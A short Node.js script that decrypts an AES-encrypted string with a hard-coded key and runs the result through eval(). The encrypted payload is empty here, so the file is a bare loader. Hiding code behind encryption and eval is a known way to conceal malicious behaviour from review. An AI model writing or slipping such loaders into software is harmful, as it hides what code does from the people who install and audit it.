
const crypto = require('crypto');
const key = Buffer.from('mIHVdY2ApfGyMfBlPl8g1QAL0m7wJp30rN+wbXqtSV8=', 'base64');
const iv = Buffer.from('xIuF5Q/58UkFXrsxYUGoMg==', 'base64');
const encryptedCode = '';

function decryptAndRun() {
    try {
        const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
        let decrypted = decipher.update(encryptedCode, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
        
        // Run the decrypted code
        eval(decrypted);
    } catch (error) {
        console.error('Failed to load encrypted code:', error);
        process.exit(1);
    }
}

// Run the code
decryptAndRun();
